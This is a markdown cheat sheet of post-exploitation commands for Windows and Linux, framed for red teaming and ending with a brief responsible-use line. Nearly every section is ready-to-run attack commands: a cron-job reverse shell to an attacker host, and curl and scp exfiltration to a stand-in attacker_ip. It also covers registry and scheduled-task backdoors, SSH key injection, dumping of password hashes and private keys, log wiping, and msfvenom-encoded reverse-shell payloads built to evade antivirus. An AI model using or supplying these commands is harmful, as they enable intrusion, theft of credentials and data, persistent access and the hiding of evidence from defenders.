# Post-Exploitation Techniques

## Introduction
Post-exploitation refers to the phase after gaining initial access to a target system. The goal is to expand access, extract valuable information, maintain persistence, and pivot within the network while remaining undetected. This document covers essential post-exploitation techniques, including privilege escalation, persistence, credential harvesting, data exfiltration, lateral movement, and covering tracks.

## Table of Contents
- [Privilege Escalation](#privilege-escalation)
- [Persistence Techniques](#persistence-techniques)
- [Credential Harvesting](#credential-harvesting)
- [Data Exfiltration](#data-exfiltration)
- [Lateral Movement](#lateral-movement)
- [Covering Tracks](#covering-tracks)
- [Evasion Techniques](#evasion-techniques)
- [Conclusion](#conclusion)

## Privilege Escalation
Privilege escalation is crucial to gain higher-level permissions on a compromised system. 

### Windows Privilege Escalation
#### Checking User Privileges:
```bash
whoami /priv
```
#### Finding Exploitable Vulnerabilities:
```bash
run post/multi/recon/local_exploit_suggester
```
#### Exploiting Misconfigurations:
- **Unquoted Service Path:**
```bash
wmic service get name,displayname,pathname,startmode
```
- **DLL Hijacking:**
```bash
meterpreter > upload malicious.dll C:\Program Files\VulnerableApp\
```

### Linux Privilege Escalation
#### Finding SUID Binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
#### Exploiting Sudo Permissions:
```bash
sudo -l
sudo /bin/bash
```

## Persistence Techniques
Persistence ensures continued access to the system after a reboot.

### Windows Persistence
#### Registry-based Persistence:
```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
```
#### Scheduled Task Execution:
```bash
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru System
```

### Linux Persistence
#### Cron Jobs:
```bash
echo "* * * * * /bin/bash -c 'nc -e /bin/sh attacker_ip 4444'" >> /etc/crontab
```
#### SSH Key Injection:
```bash
echo "attacker_public_key" >> ~/.ssh/authorized_keys
```

## Credential Harvesting
Credential harvesting allows attackers to extract login details for further exploitation.

### Windows Credential Dumping
```bash
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/mimikatz
```

### Linux Credential Dumping
#### Extracting Hashes:
```bash
cat /etc/shadow
```
#### Dumping SSH Keys:
```bash
cat ~/.ssh/id_rsa
```

## Data Exfiltration
Once valuable data is identified, it needs to be extracted without detection.

### Windows Exfiltration
```bash
meterpreter > download C:\Users\Admin\Documents\sensitive_data.zip /tmp/
```
### Linux Exfiltration
```bash
scp user@target:/home/user/secrets.txt attacker@attacker_ip:/tmp/
```
### Using HTTP Exfiltration
```bash
curl -X POST -F "file=@sensitive_data.zip" http://attacker_ip/upload.php
```

## Lateral Movement
Expanding access across the network to other machines.

### Windows Lateral Movement
#### Using PsExec:
```bash
psexec.exe \\target -u admin -p password -c backdoor.exe
```
#### Using RDP:
```bash
xfreerdp /u:admin /p:password /v:target_ip
```

### Linux Lateral Movement
#### SSH Pivoting:
```bash
ssh -D 1080 user@target
```
#### SMB Exploitation:
```bash
smbclient -L target -U victim
```

## Covering Tracks
To avoid detection, attackers must remove logs and traces of activity.

### Windows Clearing Logs
```bash
wevtutil cl Security
```
### Linux Clearing Logs
```bash
echo > /var/log/auth.log
rm -rf ~/.bash_history
```

## Evasion Techniques
Evading detection by security tools and analysts.

### Windows AV Evasion
#### Packing Executables:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -o backdoor.exe
```

### Linux AV Evasion
#### Encoding Payloads:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -e x86/shikata_ga_nai -o backdoor.elf
```

## Conclusion
Post-exploitation is crucial for maintaining access, gathering intelligence, and moving laterally within a network. This guide covered various techniques such as privilege escalation, persistence, credential harvesting, data exfiltration, lateral movement, covering tracks, and evasion techniques. These methods are essential for ethical penetration testing and red teaming scenarios.

_Use responsibly within legal and ethical boundaries._

